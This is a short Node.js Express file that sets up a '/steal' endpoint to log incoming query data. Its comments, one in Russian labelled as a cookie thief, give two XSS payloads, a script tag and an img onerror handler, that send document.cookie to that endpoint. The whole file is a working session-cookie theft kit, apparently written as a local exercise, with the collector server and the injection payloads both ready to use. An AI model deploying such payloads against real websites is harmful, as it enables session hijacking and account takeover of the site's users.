const express = require("express");

const app = express();

app.get("/steal", function(request, response){
    console.log(request.query);
    response.send("Ok");
});
app.listen(4200);

// вор кук
// <script>let stealImg = document.createElement('img');stealImg.src = 'http://127.0.0.1:4200/steal?cookie=' + document.cookie;document.body.appendChild(stealImg);</script>
// <img id="thief" width='0px' height='0px'><img src='' onerror="thief.src='http://127.0.0.1:4200/steal?cookie=' + document.cookie;">
